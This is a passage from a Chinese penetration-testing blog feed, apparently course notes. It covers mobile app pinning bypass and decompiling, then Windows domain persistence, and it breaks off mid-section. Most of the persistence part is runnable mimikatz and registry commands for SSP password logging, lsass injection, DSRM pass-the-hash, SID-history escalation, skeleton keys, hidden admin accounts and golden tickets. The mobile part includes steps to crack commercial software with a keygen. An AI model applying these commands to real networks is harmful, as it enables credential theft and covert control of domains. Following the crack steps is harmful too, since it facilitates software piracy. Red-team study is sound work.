(APK、XAPK、IPA 和 APPX) 以及压缩源代码，并提供 REST API 以与您的 CI/CD 或 DevSecOps 管道无缝集成。动态分析器可帮助 您执行运行时安全评估和交互式仪器测试。</p>\n<p>mobsf 使用方法：<br>\n在线使用：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2JzZi5saXZlLw==\">https://mobsf.live/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/MobSF/Mobile-Security-Framework-MobSF</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装及运行MobSF：</span></span><br><span class=\"line\">docker pull opensecurity/mobile-security-framework-mobsf</span><br><span class=\"line\">docker run -it -p 8008:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">（前面的端口是宿主机的端口，后面的端口是docker中容器的端口）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问http://110.42.178.227:8008/上传应用程序即可进行软件自动化分析。分析结果比</span></span><br></pre></td></tr></table></figure>\n<p>AppInfoScan 要更好一些，资产分析的更加全面一点。</p>\n<h4 id=\"mobexler-移动测试\"><a class=\"markdownIt-Anchor\" href=\"#mobexler-移动测试\">#</a> Mobexler 移动测试</h4>\n<p>Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软 件等，这些都是安全测试 Android 和 iOS 应用程序所必需的。集成有大量的安卓测试工具哦。</p>\n<p>官网地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2JleGxlci5jb20v\">https://mobexler.com/</span></p>\n<h3 id=\"apk-数据包捕获\"><a class=\"markdownIt-Anchor\" href=\"#apk-数据包捕获\">#</a> apk 数据包捕获</h3>\n<p>有些 app 是不能够抓取到数据包的，有两种可能。一是 app 内部进行了反 代理设置，另外一种情况是进行了证书校验。而一般我们在模拟器里边配置的 证书只能解决客户端的单向校验问题，如果是双向校验也不能抓取到数据包。</p>\n<h4 id=\"反代理绕过\"><a class=\"markdownIt-Anchor\" href=\"#反代理绕过\">#</a> 反代理绕过</h4>\n<p>对于反代理设置，是因为 app 中有代码设置为将当前的数据禁止发往 wifi 的代理，否则显示网络错误，可以通过两种方式来解决，一是通过模拟器自带 的抓包工具来抓包，而不是通过 wif 的代理来转发流量，而是通过 profixier+burp 的方式来绕过此限制。profixier 添加 burp 的端口，并设置规则为 noxhandler 和 nox (可以通过当前正在运行的进程和软件的属性中软件的启动程序来确定)， 此时数据被 proxifer 代理，流量发送至了 burp。</p>\n<h4 id=\"证书校验绕过\"><a class=\"markdownIt-Anchor\" href=\"#证书校验绕过\">#</a> 证书校验绕过</h4>\n<ul>\n<li>情况 1: 客户端不存在证书校验，服务器也不存在证书校验。</li>\n</ul>\n<p>对于无证书校验，只要在 burp 上配置证书就可以了；</p>\n<ul>\n<li>情况 2: 客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。</li>\n</ul>\n<p>对于单证书校验，通过 xposed 框架，在模拟器上安装 xposed 并在其内安装新添加的 justTrust 的 apk，来通过工具绕过证书校验，此时再次设置网络代理仍旧可以抓取到数据包；</p>\n<ul>\n<li>情况 3: 客户端存在证书校验，服务器也存在证书校验，双向校验。</li>\n</ul>\n<p>如果是双向证书校验，可以通过两种种方式来绕过。首先就是 frida+r0capture 的方式来捕获所有的网络数据包；或是通过反编译 apk 去掉证书校验的代码在重新编译好的 apk 抓包。</p>\n<h4 id=\"双向证书校验绕过\"><a class=\"markdownIt-Anchor\" href=\"#双向证书校验绕过\">#</a> 双向证书校验绕过</h4>\n<p>模拟器用代理抓取数据包被禁止的解决方法：r0capture+firda</p>\n<ul>\n<li>r0capture：安卓应用层抓包通杀脚本 配合 firda 使用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/r0ysue/r0capture</span></span><br><span class=\"line\">Attach 模式，抓包内容保存成pcap文件供后续分析：</span><br><span class=\"line\">python3 r0capture.py -U com.qiyi.video -v -p iqiyi.pcap</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Firda</li>\n</ul>\n<p>Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。</p>\n<p>地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZyaWRhL2ZyaWRhL3JlbGVhc2Vz\">https://github.com/frida/frida/releases</span></p>\n<ul>\n<li>测试</li>\n</ul>\n<p>环境：Windows10 Python3.7 夜神模拟器 r0capture frida-server wireshark</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 本地安装Frida</span></span><br><span class=\"line\">pip install frida &amp;&amp; pip install frida-tools</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 模拟器安装Frida，注意版本要与本地Frida一致</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果是真机，就一定是ARM版本</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看模拟器的是位数是 32 还是 64 ：</span></span><br><span class=\"line\">getprop ro.product.cpu.abi</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">真机与模拟器之间传输文件</span></span><br><span class=\"line\">adb push frida-server /data/local/frida-server</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在模拟器中运行frida-server</span></span><br><span class=\"line\">bash /data/local/frida-server</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 转发并启动Frida：</span></span><br><span class=\"line\">adb forward tcp:27042 tcp:27042</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接判断</span></span><br><span class=\"line\">frida-ps -U &amp;&amp; frida-ps -R</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取包名（ 或 通过应用软件Apk Messenger）：</span></span><br><span class=\"line\">ls /data/data</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过r0capture 抓包</span></span><br><span class=\"line\">python r0capture.py -U -f 包名 - p xxxx.pcap</span><br></pre></td></tr></table></figure>\n<h3 id=\"脱壳与加壳\"><a class=\"markdownIt-Anchor\" href=\"#脱壳与加壳\">#</a> 脱壳与加壳</h3>\n<p>有的应用为了防止被反编译，在应用程序生成之后还会进行一层加固即加 壳，如果能够设法脱壳是可以进行反编译的否则就没办法得到源代码。查壳工 具 ApkScan-PKID 可以得到当前应用程序是否加壳，是以哪种方式进行加壳的。 另有脱壳工具 BlackDex，直接下载运行即可。</p>\n<p>下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NvZGluZ0dheS9CbGFja0RleCVFMyU4MCU4Mg==\">https://github.com/CodingGay/BlackDex。</span></p>\n<h4 id=\"apk程序反编译\"><a class=\"markdownIt-Anchor\" href=\"#apk程序反编译\">#</a> apk 程序反编译</h4>\n<p>Apkkiller 可以进行反编译，提取到源代码并进行导出，加载到 IDEA 中去识别相应逻辑。如果要修改源代码中的某些功能，需要寻找到对应位置进行修改。</p>\n<p>安卓修改大师是一款集成化的工具，可以反编译，修改图标，搜索源代码， 查看 java/smail 代码，重新签名打包等，比较适合用来检测 apk 的安全。修改软 件功能，如观看次数及是否是会员的操作，一般是搜索源代码中的关键词进行 定位，判断业务逻辑，确定当前数据来源，是否依托于网络数据还是就是在本 地存储的，如果是本地存储的就可以修改。</p>\n<h4 id=\"安卓修改大师破解\"><a class=\"markdownIt-Anchor\" href=\"#安卓修改大师破解\">#</a> 安卓修改大师破解</h4>\n<p>下载并安装原程序，先不要运行软件；</p>\n<p>接着把 crack 文件夹里的 “ApkHelper.exe” 拷贝到软件安装目录下替换；【默认路径 C:\\Program Files (x86)\\ApkEditor】</p>\n<p>再用 crack 文件夹里的注册机进行注册；</p>\n<p>至此就全部破解完成啦，用户可随意使用里面的功能了</p>\n<h3 id=\"微信小程序安全\"><a class=\"markdownIt-Anchor\" href=\"#微信小程序安全\">#</a> 微信小程序安全</h3>\n<h4 id=\"微信小程序抓包\"><a class=\"markdownIt-Anchor\" href=\"#微信小程序抓包\">#</a> 微信小程序抓包</h4>\n<ul>\n<li>安卓系统抓包（微信小程序）：</li>\n</ul>\n<p>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书</p>\n<p>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书</p>\n<p>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书</p>\n<ul>\n<li>基于上述我们解决的方式如下：</li>\n</ul>\n<p>将证书安装到系统证书中（需要 root）<br>\n苹果手机（苹果手机不受此影响）<br>\n采用安卓系统低于 7.0 的模拟器<br>\n使用低版本电脑版微信小程序抓包</p>\n<p>逍遥模拟器多开器 5.1 安卓系统微信小程序抓包，夜神模拟器多开 5 安卓系统微信小程序抓包，真机 IPhone-IOS 系统微信小程序抓包抓包本机需要和 Iphone 手机处于同一 WIFI 下，Iphone 配置 wifi 的代理，代理设置地址写本地抓包的工具地址和端口。</p>\n<h4 id=\"小程序反编译\"><a class=\"markdownIt-Anchor\" href=\"#小程序反编译\">#</a> 小程序反编译</h4>\n<ul>\n<li>小程序助手付费版：</li>\n</ul>\n<p>使用教程地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FuY2xvdWQuY24vbHVkZXFpL3hjeHpzLzI2MDc2Mzc=\">https://www.kancloud.cn/ludeqi/xcxzs/2607637</span><br>\n 最新版下载地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly94Y3guc2lxaW5ndy50b3AveGN4LnppcA==\">https://xcx.siqingw.top/xcx.zip</span></p>\n<p>每一个小程序在点击时都会产生一个相应的文件夹，此文件夹中有一个 wxapkg 后缀的文件包含有当前小程序的相关源码。用此软件进行反编译，一般 都会生成 js 源码，可以分析此源码中的知识，找出相关敏感信息，进行利用。 如果此 js 采用了 node.js 框架，那么原先的小程序就是存在 node.js 的相关漏洞可 以进行利用的。</p>\n<p>如果该小程序比较大，除了首次加载出来的 wxapkg 后缀的文件包，在其他 页面可能也有 js 子系统，会有其他的 wxapkg 产生。需要将生成的 wxapkg 都进 行反编译，分析多套源码才算完整。</p>\n<p>微信小程序可以通过 proxifier 设置规则代理流量至 burp/fiddler，需要将当 前小程序运行的进程进行代理。但是不一定准确，有一次测试代理了部分流量， 一些关键数据包无法捕获。</p>\n<ul>\n<li>WxAppUnpacker 反编译小程序</li>\n</ul>\n<p>工具地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbnJpcWluZy9XeEFwcFVucGFja2Vy\">https://github.com/sanriqing/WxAppUnpacker</span></p>\n<p>安装 node.js: <span class=\"exturl\" data-url=\"aHR0cDovL25vZGVqcy5jbi9kb3dubG9hZC8=\">http://nodejs.cn/download/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装依赖</span></span><br><span class=\"line\">npm install</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">部分wxapkg还需要解密</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">模拟器取出wxapkg文件</span></span><br><span class=\"line\">/data/data/com.tencent.mm/MicroMsg/x/appbrand/pkg</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">反编译解包</span></span><br><span class=\"line\">node wuWxapkg.js -s=../ xxxx.wxapkg</span><br></pre></td></tr></table></figure>\n<h4 id=\"小程序安全点\"><a class=\"markdownIt-Anchor\" href=\"#小程序安全点\">#</a> 小程序安全点</h4>\n<ul>\n<li>渗透角度</li>\n</ul>\n<p>测试的 app 提供服务的服务器，网站，接口等，一旦这个有安全问题，被 不法分子利用，相当于 APP 正常服务就会受到直接的影响！APK - 白盒 - Java 代码审计，APK - 黑盒 - 资产 &amp; WEB&amp;IP &amp; 接口等，小程序 - 白 盒 - Node.JS 代码审计，小程序 - 黑盒 - 资产 &amp; WEB&amp;IP &amp; 接口等</p>\n<ul>\n<li>开发角度</li>\n</ul>\n<p>测试 app 中代码，采用没加密的发送数据，采用权限过高的设置导致攻击者利用 app 获取到手机的敏感信息等。如弱加密，逻辑安全，授权，中间人等。</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "title": "XD22 12 权限维持",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"内网域维持权限\"><a class=\"markdownIt-Anchor\" href=\"#内网域维持权限\">#</a> 内网域维持权限</h3>\n<p>参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGN4YmxvZ3MvcC8xNDIxNjUyNS5odG1s\">https://www.cnblogs.com/lcxblogs/p/14216525.html</span></p>\n<h4 id=\"验证dll加载-ssp\"><a class=\"markdownIt-Anchor\" href=\"#验证dll加载-ssp\">#</a> 验证 DLL 加载 SSP</h4>\n<p>攻防实战中，靶机很难会重启，攻击者重启的话风险过大，因此可以在靶机上把两个方法相互结合起来使用效果比较好，尝试利用把生成的日志密码文件发送到内网被控机器或者临时邮箱。</p>\n<p>（ 1 ）但如果域控制器重启，被注入内存的伪造的 SSP 将会丢失。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导出密码</span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">misc::memssp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">记录登录的账号密码</span></span><br><span class=\"line\">C:\\Windows\\System32\\mimilsa.log </span><br></pre></td></tr></table></figure>\n<p>（ 2 ）使用此方法即使系统重启，也不会影响到持久化的效果。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mimilib</span></span><br><span class=\"line\">mimilib.dll 传到目标域控的c:\\windows\\system32\\目录下</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改注册表，重启生效</span></span><br><span class=\"line\">reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v &quot;Security Packages&quot;</span><br><span class=\"line\">reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">记录账号密码文件</span></span><br><span class=\"line\">c:\\windows\\system32\\kiwissp.log </span><br></pre></td></tr></table></figure>\n<h4 id=\"验证dll加载-hook\"><a class=\"markdownIt-Anchor\" href=\"#验证dll加载-hook\">#</a> 验证 DLL 加载 HOOK</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3doME5zcS9Ib29rUGFzc3dvcmRDaGFuZ2U=\">https://github.com/wh0Nsq/HookPasswordChange</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvTWlzYy1XaW5kb3dzLUhhY2tpbmc=\">https://github.com/clymb3r/Misc-Windows-Hacking</span></p>\n<p><code>powershell -exec bypass -Command &quot;&amp; &#123;Import-Module 'C:\\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\\HookPasswordChange. dll -procname lsass&#125;&quot;</code></p>\n<h4 id=\"机制账号启用dsrm\"><a class=\"markdownIt-Anchor\" href=\"#机制账号启用dsrm\">#</a> 机制账号启用 DSRM</h4>\n<p>利用系统自带机制模式 DSRM，修改 DSRM 默认登录方式和属性，通过其同步 krgtgt 进行 PTH 攻击，实现持续化控制，但适用于系统 &gt;=windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM 账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取dsrm及krbtgt的NTLM <span class=\"built_in\">hash</span></span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">lsadump::lsa /patch /name:krbtgt</span><br><span class=\"line\">token::elevate</span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">dsrm&amp;krbtgt&amp;NTLM <span class=\"built_in\">hash</span>同步</span></span><br><span class=\"line\">NTDSUTIL：打开ntdsutil</span><br><span class=\"line\">set DSRM password：修改DSRM的密码</span><br><span class=\"line\">sync from domain account 域用户名字：使DSRM的密码和指定域用户的</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码同步</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">(第 1 次)：退出DSRM密码设置模式</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">(第 2 次)：退出ntdsutil</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改dsrm登录方式</span></span><br><span class=\"line\">New-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用PTH传递攻击</span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed9749</span><br><span class=\"line\">5408e1537f706c357fc5</span><br><span class=\"line\">dir \\\\owa2010cn-god\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"用户属性修改\"><a class=\"markdownIt-Anchor\" href=\"#用户属性修改\">#</a> 用户属性修改</h4>\n<p>把域控管理员的 SID 加入到其他某个恶意的域账户的 SID History 中，然后这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修改域账户一直存在。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取某用户SID属性</span></span><br><span class=\"line\">Import-Module ActiveDirectory</span><br><span class=\"line\">Get-ADUser webadmin -Properties sidhistory</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">给予某用户administrator属性</span></span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">sid::patch</span><br><span class=\"line\">sid::add /sam:webadmin /new:administrator</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测评给与前后的DC访问权限：</span></span><br><span class=\"line\">dir \\\\192.168.3.21\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"登录进程劫持\"><a class=\"markdownIt-Anchor\" href=\"#登录进程劫持\">#</a> 登录进程劫持</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">因为Skeleton Key技术是被注入到lsass.exe进程的，所以它只存在内存中，如域控重启，万能密码将失效。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">测试域内某个用户与DC通讯</span> </span><br><span class=\"line\">dir \\\\owa2010cn-god\\c$</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接DC后，DC注入lsass进程</span></span><br><span class=\"line\">net use \\\\192.168.3.21\\ipc$ &quot;Admin12345&quot; /user:god\\administrator</span><br><span class=\"line\">mimikatz：</span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">misc::skeleton</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重新测试域内某个用户与DC通讯</span></span><br><span class=\"line\">net use \\\\owa2010cn-god\\ipc$ &quot;mimikatz&quot; /user:god\\administrator</span><br><span class=\"line\">dir \\\\owa2010cn-god\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"隐藏域管用户\"><a class=\"markdownIt-Anchor\" href=\"#隐藏域管用户\">#</a> 隐藏域管用户</h4>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9DcmVhdGVIaWRkZW5BY2NvdW50\">https://github.com/wgpsec/CreateHiddenAccount</span><br>\n 控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除。<br>\nCreateHiddenAccount -u xiaodi -p Xiaodi!@#45</p>\n<h4 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h4>\n<p>黄金票据生成攻击，是生成有效的 TGT Kerberos 票据，并且不受 TGT 生命周期的影响（TGT 默认 10 小时，最多续订 7 天），这里可以为任意用户生称黄金票据，然后为域管理员生成 TGT，这样普通用户就可以变成域管理员。</p>\n<p>已经拿下域管理员，获取到 krbtgt hash; 利用 krbtgt 的 hash 制作黄金票据 工具，进行攻击。该攻击方式其实是一种后门的形式，属于第二次进行攻击的 方法。第一次拿到域管权限之后，需要将 krbtgt NTLM hash 进行保存，当第二 次再来进行域渗透攻击时，我们就可使用 krbtgt 的 NTLM hash 制作黄金票据， 从而再次获得域管权限。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取域名，域sid值</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域名：god.org，域SID值：S-1-5-21-1218902331-2157346161-1782232778</span></span><br><span class=\"line\">whoami /user</span><br><span class=\"line\">whoami /all</span><br><span class=\"line\">wmic useraccount get name,sid</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取krbtgt的ntlm：域的KRBTGT账户NTLM-HASH：b097d7ed97495408e1537f706c357fc5</span></span><br><span class=\"line\">mimikatz privilege::debug</span><br><span class=\"line\">mimikatz lsadump::lsa /patch</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">伪造用户名：webadmin（任意用户名）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成票据</span></span><br><span class=\"line\">mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入内存</span></span><br><span class=\"line\">mimikatz kerberos::ptt g</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问测试</span></span><br><span class=\"line\">dir \\\\owa2010cn-god\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h4>\n<p>白银票据 (SILVER TICKET) 是利用域的服务账户进行伪造的 ST，在 Ker beros 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进 行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST， 从而获得 Session Key。所以只需要知道 Server 用户的 Hash 就可以伪造出一个 ST，且不会经过 KDC，但是伪造的门票只对部分服务起作用 (不需要交互 KDC，需要知道 Server 的 NTLM Hash)。</p>\n<p>已经拿下域管理员，获取到 DC hash；利用 DC 的 hash 制作白银票据工具，进行攻击。伪造的 ST，只能访问指定的服务，如 CIFS；不与 KDC 交互，直接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 